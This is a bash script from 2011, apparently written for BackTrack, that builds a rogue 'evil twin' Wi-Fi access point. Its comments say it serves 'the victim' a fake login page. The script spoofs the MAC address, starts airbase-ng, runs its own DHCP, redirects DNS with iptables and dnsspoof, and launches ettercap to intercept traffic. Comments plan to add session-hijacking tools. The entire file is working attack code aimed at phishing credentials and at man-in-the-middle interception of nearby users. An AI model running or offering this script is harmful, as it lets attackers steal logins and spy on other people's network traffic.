#!/bin/bash
#script when u want to the victim to get a custom webpage in which he will login to access internet v0.1
#configure apache accordinglly
#this was tested on bt 4 r2
#author rahil 
#date:22/10/2011
#website:lihars.tk
#this is refined form of original scripts that can be found on backtrack-linux.org/forum 
#to do--integrate with hamster,urlsnarf and other tools
#to do--make user friendly
#http://code.google.com/p/rsfakeap/downloads/list
#fake ap running its own
#dhcpd server
#dns server
#apache2
#(see in hd  prsnl folder www)-my use
#my alfa card was givig problems when restarting in vmware so no need  for first 5 lines if u dont face
#any problems
#change interfaces accordingly
/etc/init.d/networking restart
rmmod rtl8187
rfkill block all
rfkill unblock all
modprobe rtl8187
rfkill unblock all
ifconfig wlan0 up
ifconfig wlan0 down
macchanger -a wlan0
aireplay-ng -9 wlan0
airmon-ng start wlan0 11
#The next step is to properly configure the DHCP server (dhcpd). You should edit the following configuration file:
#/etc/dhcp3/dhcpd.conf
konsole -e airbase-ng -e Volsssss -c 11 mon0 &        //change accordingly
sleep 12
ifconfig at0 up
ifconfig at0 10.0.0.1/24
ifconfig at0 mtu 1400
route add -net 10.0.0.0/24 gw 10.0.0.1

iptables --flush
iptables --delete-chain
iptables -t nat --flush
iptables -t nat --delete-chain


iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 10.0.0.1


iptables -A FORWARD -i at0 -j ACCEPT
echo "1" > /proc/sys/net/ipv4/ip_forward
echo > '/var/lib/dhcp3/dhcpd.leases'

konsole -e dhcpd3 -d -f -cf /etc/dhcp3/dhcpd.conf at0 &


konsole -e dnsspoof -i at0 -f /usr/share/dsniff/dnsspoof.hosts &

sudo /etc/init.d/apache2 restart                            //configure accordingly


konsole -e ettercap -T -q -p -i at0 // // &

sleep 10



